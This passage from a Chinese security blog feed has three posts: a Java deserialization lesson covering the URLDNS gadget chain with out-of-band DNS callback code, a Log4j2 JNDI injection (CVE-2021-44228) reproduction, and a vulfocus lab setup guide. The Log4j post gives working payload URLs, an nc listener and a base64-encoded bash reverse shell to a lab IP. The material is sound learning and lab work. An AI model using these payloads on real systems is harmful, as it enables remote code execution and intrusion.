15:49</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ois.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>自定义readObject函数在入口类中————运行序列化程序serialize.java————运行反序列化程序unserialize.java————计算器弹窗</p><ol start="2"><li><p>入口参数中包含可控类，该类有危险方法<code>readObject</code> 时调用</p></li><li><p>入口类参数中包含可控类，该类又调用其他有危险方法的类readObject时调用</p></li><li><p>构造函数&#x2F;静态代码块等类加载时隐式执行</p></li></ol><h1 id="四、反序列化漏洞攻击思路"><a href="#四、反序列化漏洞攻击思路" class="headerlink" title="四、反序列化漏洞攻击思路"></a>四、反序列化漏洞攻击思路</h1><ul><li>攻击前提：实现Serializable（implement Serializable）</li></ul><p>基本思路：</p><ol><li>入口类：source （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个Object作为参数；最好 jdk 自带）</li><li>找到入口类之后要找调用链 gadget chain 相同名称、相同类型</li><li>执行类 sink （RCE SSRF 写文件等等）比如 <code>exec</code> 这种函数</li></ol><h2 id="4-1-HashMap举例说明如何找到入门类"><a href="#4-1-HashMap举例说明如何找到入门类" class="headerlink" title="4.1 HashMap举例说明如何找到入门类"></a>4.1 HashMap举例说明如何找到入门类</h2><ul><li>攻击前提：实现Serializable（implement Serializable）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272207377.png" alt="image-20240727220725322"></p><p>首先，来到HashMap重写的<code>readObject函数</code>中寻找执行<code>readObject</code>操作的地方</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272232143.png" alt="image-20240727223224068"></p><p>可以发现HashMap传入的参数<code>key</code>和<code>value</code>进行了<code>readObject</code>操作，随后再将key变量进行<code>hash</code>操作；跟入~</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272234646.png" alt="image-20240727223434596"></p><p>发现，当key值不为空null时，会调用key的hashCode()方法；同时，我们可以发现key的类型为Object，满足我们 调用常见的函数 这一条件。</p><h2 id="4-2-URLDNS实战"><a href="#4-2-URLDNS实战" class="headerlink" title="4.2 URLDNS实战"></a>4.2 URLDNS实战</h2><blockquote><p>根据Drunkbaby所说，URLDNS利用链到底能不能称之为利用链的探讨，其实我并不关心，因为我听不懂！重点放在理解内容上</p></blockquote><p>URL利用链的优点如下，非常适合我们用于检测反序列化漏洞：</p><ol><li>使⽤ Java 内置的类构造，对第三⽅库没有依赖。</li><li>在⽬标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞 URL 类，调用 <code>openConnection</code> 方法，到此处的时候，其实 <code>openConnection</code> 不是常见函数，就已经难以利用了。</li></ol><p>查看ysoserial 项目的URLDNS链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *   Gadget Chain:</span><br><span class="hljs-comment"> *     HashMap.readObject()</span><br><span class="hljs-comment"> *       HashMap.putVal()</span><br><span class="hljs-comment"> *         HashMap.hash()</span><br><span class="hljs-comment"> *           URL.hashCode()</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><blockquote><p>反复观看师傅的博客终于看明白了！</p><p>利用链中的URL.hashCode()中的URL怎么来的？我们经过上述的分析可以知道，URL应该是<key>，那么就是HashMap&lt;key, value&gt;中的键。如何得到，那么就是创建一个HashMap&lt;URL, Integer&gt;，然后调用HahsMap中的put函数将特定的键值输入其中。</p></blockquote><p>我们来到HashMap中的<code>put</code>函数，可以看到put函数调用了<code>hash</code>函数，<code>hash</code>函数则是调用了<code>hashcode</code>函数。</p><p>那么现在我们来研究一下<code>URL</code>类中的<code>hashcode</code>函数，可以看到是<code>handler</code>调用了<code>hashCode</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272309684.png" alt="image-20240727230913616"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272310836.png" alt="image-20240727231053778"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272311383.png" alt="image-20240727231139313"></p><p>一步步跟入可以发现其调用了<code>getHostAddress(u)</code>其中<code>u</code>为传入的参数；再继续跟入就到了师傅所说的<code>InetAddress.getByName(host)</code>了，作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询。到这⾥就不必要再跟了。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272312890.png" alt="image-20240727231251824"></p><p>确实，到这里思路就已经非常清晰了，大概可以知道这个利用链如何实现的啦！</p><ol><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>以下是复现师傅的“程咬金”，理解即可！<a href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#URLDNS-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84-POC">详细参考</a>（本人写得非常简化，所以还是参考师傅本人的吧，确实有点懒了）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://3dhr3wop8l59k8qfhew3ddvuklqee42t.oastify.com&quot;</span>);<br>        HashMap&lt;URL, Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        hashmap.put(url, <span class="hljs-number">1</span>);<br>        serialize(hashmap);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272331296.png" alt="image-20240727233102240"></p><p>由于URL类中的<code>hashCode</code>变量的值默认是-1，所以会默认调用URL的<code>hashCode</code>函数导致执行<code>getByName()</code>函数从而产生DNS请求，所以需要通过反射机制修改<code>hashCode</code>变量的默认值-1，使其序列化时不会调用<code>hashCode</code>函数。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272334790.png" alt="image-20240727233410740"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272354425.png" alt="image-20240727233345600"></p><p>以下是修改后的序列化函数，此时在序列化时就不会产生DNS请求啦。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.serialize;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.serialize.serializationTest.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/27 15:51</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">serializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://ztwnjs4lohl5046bxaczt9bq0h6bu2ir.oastify.com&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashCode.setAccessible(<span class="hljs-literal">true</span>);<br>        hashCode.set(url, <span class="hljs-number">1234</span>);    <span class="hljs-comment">// 设置url变量中的hashCode变量值为1234</span><br>        HashMap&lt;URL, Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        hashmap.put(url, <span class="hljs-number">1</span>);<br>        hashCode.set(url, -<span class="hljs-number">1</span>);<br>        serialize(hashmap);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.unserialize;<br><br><span class="hljs-keyword">import</span> com.mango.serialize.Person;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.unserialize.unserializeTest.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/27 15:55</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">unserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        HashMap&lt;URL, Integer&gt; unserialize = (HashMap&lt;URL, Integer&gt;) unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><ol><li><p>谢谢Drunkbaby师傅，收获良多！写得真的非常好</p></li><li><p>反序列化漏洞利用的条件是必须实现Serializable</p></li><li><p>漏洞利用的基本思路与反序列化利用链挖掘思路</p><blockquote><p>以下是个人的一点小小理解：（每个人理解可能都不一样）</p><ol><li>找到入口类（寻找实现Serializable的类），然后分析其重写readObject函数，查看其调用的常见函数（最好是参数类型是Object或者其他宽泛的类型），最好该函数jdk自带</li><li>寻找类中存在相同常见函数的类，并且该函数调用了一些可利用的函数例如<code>exec</code>等等</li><li>在构思传入指定数值类型的参数进行序列化后以指定类调用该常见函数，从而执行该类中常见函数中存在的危险函数</li></ol><p>个人理解的本质就是找寻不同类中同名函数是否存在危险函数，从而对危险函数的利用。</p></blockquote></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>反序列化</tag>
      
      <tag>利用链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(CVE-2021-44228)Apache-Log4j2-JNDI注入-远程代码执行漏洞</title>
    <link href="/2024/07/26/CVE-2021-44228-Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/07/26/CVE-2021-44228-Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h1><p>Apache Log4j 2是一个开源的日志记录组件，使用非常的广泛。在工程中以易用方便代替了 System.out 等打印语句，它是JAVA下最流行的日志输入工具。</p><p>使用 Log4j 2 在一定场景条件下处理恶意数据时，可能会造成注入类代码执行。</p><h1 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h1><p>Apache log4j2 &gt;&#x3D; 2.0, &lt;&#x3D; 2.14.1</p><p>Apache Log4j 2.0-beta9 - 2.12.1 、Apache Log4j 2.13.0 - 2.15.0-rc1</p><h1 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h1><h2 id="3-1-漏洞分析"><a href="#3-1-漏洞分析" class="headerlink" title="3.1 漏洞分析"></a>3.1 漏洞分析</h2><p>使用 DNSLog 平台获取一个子域名进行jndi注入点测试</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407262141923.png" alt="image-20240726214110819"></p><p>注入检测，获取到 Java 版本号，检测是否存在jndi注入远程代码执行漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.j6zzen.dnslog.cn&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407262141423.png" alt="image-20240726214117388"></p><p>根据上述输出子域名刷新记录可知确实存在jndi注入，远程代码执行漏洞；</p><h2 id="3-2-攻击脚本"><a href="#3-2-攻击脚本" class="headerlink" title="3.2 攻击脚本"></a>3.2 攻击脚本</h2><p>使用工具部署jndi服务<a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ4LjEyOC81NTU1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A 192.168.48.128 <br></code></pre></td></tr></table></figure><p>执行的命令为经过编码的反弹shell的命令<a href="https://ares-x.com/tools/runtime-exec">RUNTIME.EXEC PAYLOAD GENERATER</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.48.128/5555 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407262149062.png" alt="image-20240726214931013"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407262149571.png" alt="image-20240726214952542"></p><p>由于刚才获得的java版本是1.8，所以我们使用JDK1.8的target环境</p><p>在监听机中进行端口监听，等待shell反弹；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 5555<br></code></pre></td></tr></table></figure><p>进行链接访问反弹shell获取root全新啊</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:8983/solr/admin/cores?action=<span class="hljs-variable">$&#123;jndi:ldap://192.168.48.128:1389/vcnt4s&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407262152772.png" alt="image-20240726215222737"></p>]]></content>
    
    
    <categories>
      
      <category>攻防渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>cve复现</tag>
      
      <tag>web攻防</tag>
      
      <tag>log4j</tag>
      
      <tag>jndi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulfocus靶场搭建教程</title>
    <link href="/2024/07/16/vulfocus%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"/>
    <url>/2024/07/16/vulfocus%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="一、安装docker环境"><a href="#一、安装docker环境" class="headerlink" title="一、安装docker环境"></a>一、安装docker环境</h1><p>首先，我们需要一个docker环境，直接通过命令安装即可，也可以通过官方的安装脚本安装也可以。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install docker -y<br></code></pre></td></tr></table></figure><h1 id="二、vulfocus镜像"><a href="#二、vulfocus镜像" class="headerlink" title="二、vulfocus镜像"></a>二、vulfocus镜像</h1><blockquote><p>这里主要是讨论以下网上教程都在使用的两种方法（反正我两种都没安装上）</p><p>方法一：直接通过官方的docker镜像拉取，这种方法在同步环境的时候会报“服务器内部错误，请联系管理员”，似乎是由于镜像并不是最新的镜像；</p><p>方法二：修改docker镜像源<code>https://dockerproxy.com/</code>，然后拉去镜像dockerproxy.com&#x2F;vulfocus&#x2F;vulfocus:latest，这个方法也离谱，我直接拉去不到；</p><p>如果你们也有我上述的问题，可以尝试一下我下面的方案</p></blockquote><p>上面有阐述到，通过官方镜像拉去vulfocus镜像的时候报错的原因似乎是因为镜像不是最新版本；我们直接来到dockerhub中查看vulfocus查看tag</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407162109481.png" alt="image-20240716210945416"></p><p>发现标签<code>latest</code>和<code>0.3.2.11</code>均为两年前发布，大小也均为475.84MB，但是我们最后拉去到镜像中的时候会发现其实这两个似乎不是相同的镜像；</p><p>通过以下两条命令将两个镜像均拉去到本地；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker pull vulfocus/vulfocus:latest<br>sudo docker pull vulfocus/vulfocus:0.3.2.11<br></code></pre></td></tr></table></figure><p>但是我们在拉取<code>vulfocus/vulfocus:0.3.2.11</code>时可能会遇到以下问题或io timeout问题等等（如果你们确实没有任何问题就直接跳过配置代理的过程）</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407162116641.png" alt="image-20240716211610603"></p><p>经过无数次docker镜像源更换与测试我发现，这并不是docker镜像源的问题，而是vulfocus&#x2F;vulfocus:0.3.2.11似乎只有dockerhub才能拉取到，所以似乎无法直接通过修改docker源来解决问题。这时候我们需要为Linux系统配置代理，详细教程参考：<a href="https://candyb0x.github.io/2024/07/16/Clash-for-Linux%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/">Clash-for-Linux搭建教程</a>；</p><p>配置完Linux系统代理后，我们还需要单独为docker配置代理才能够让拉取通过代理进行，以下时Docker代理配置的方法</p><h3 id="1-创建Docker守护进程配置目录"><a href="#1-创建Docker守护进程配置目录" class="headerlink" title="1. 创建Docker守护进程配置目录"></a>1. 创建Docker守护进程配置目录</h3><p>如果目录不存在，先创建目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d<br></code></pre></td></tr></table></figure><h3 id="2-创建代理配置文件"><a href="#2-创建代理配置文件" class="headerlink" title="2. 创建代理配置文件"></a>2. 创建代理配置文件</h3><p>在<code>/etc/systemd/system/docker.service.d</code>目录下创建一个名为<code>http-proxy.conf</code>的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim /etc/systemd/system/docker.service.d/http-proxy.conf<br></code></pre></td></tr></table></figure><h3 id="3-添加代理配置"><a href="#3-添加代理配置" class="headerlink" title="3. 添加代理配置"></a>3. 添加代理配置</h3><p>在文件中添加以下内容（根据你的代理配置调整）：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTP_PROXY=http://127.0.0.1:7890/&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTPS_PROXY=http://127.0.0.1:7890/&quot;</span><br></code></pre></td></tr></table></figure><h3 id="4-重新加载系统守护进程"><a href="#4-重新加载系统守护进程" class="headerlink" title="4. 重新加载系统守护进程"></a>4. 重新加载系统守护进程</h3><p>保存并关闭文件后，重新加载systemd守护进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl daemon-reload<br></code></pre></td></tr></table></figure><h3 id="5-重启Docker服务"><a href="#5-重启Docker服务" class="headerlink" title="5. 重启Docker服务"></a>5. 重启Docker服务</h3><p>重启Docker服务以使配置生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl restart docker<br></code></pre></td></tr></table></figure><h3 id="6-验证配置"><a href="#6-验证配置" class="headerlink" title="6. 验证配置"></a>6. 验证配置</h3><p>你可以通过检查Docker服务的环境变量来验证配置是否正确：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl show --property=Environment docker<br></code></pre></td></tr></table></figure><p>这应该会显示你刚刚配置的代理环境变量。</p><p>这里还有<strong>比较重要的一步</strong>就是我们需要将<code>/etc/docker/daemon.json</code>注册的镜像全部删掉，这样是为了防止docker pull从这些镜像中寻找<code>vulfocus/vulfocus:0.3.2.11</code>，然后再次重启一下docker</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">sudo <span class="hljs-params">system</span>ctl daemon-reload<br>sudo <span class="hljs-params">system</span>ctl restart docker<br></code></pre></td></tr></table></figure><p>配置完成后我们再次拉取一下<code>vulfocus/vulfocus:0.3.2.11</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker pull vulfocus/vulfocus:0.3.2.11<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407162134460.png" alt="image-20240716213423425"></p><p>拉取成功，等待其下载完毕即可；</p><p>然后我们通过命令查看以下镜像<code>vulfocus/vulfocus:latest</code>和<code>vulfocus/vulfocus:0.3.2.11</code>的区别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker images<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407162137521.png" alt="image-20240716213749442"></p><p>可以发现这两个镜像的创造时间并不一致，而且<code>vulfocus/vulfocus:0.3.2.11</code>镜像反而才是最新的，虽然dockerhub中均显示是两年前，但是事实证明<code>vulfocus/vulfocus:0.3.2.11</code>镜像应该才是我们所需的镜像，这也是为什么拉取<code>vulfocus/vulfocus:latest</code>镜像会报错“服务器内部错误，请联系管理员”了。</p><h1 id="三、启动镜像"><a href="#三、启动镜像" class="headerlink" 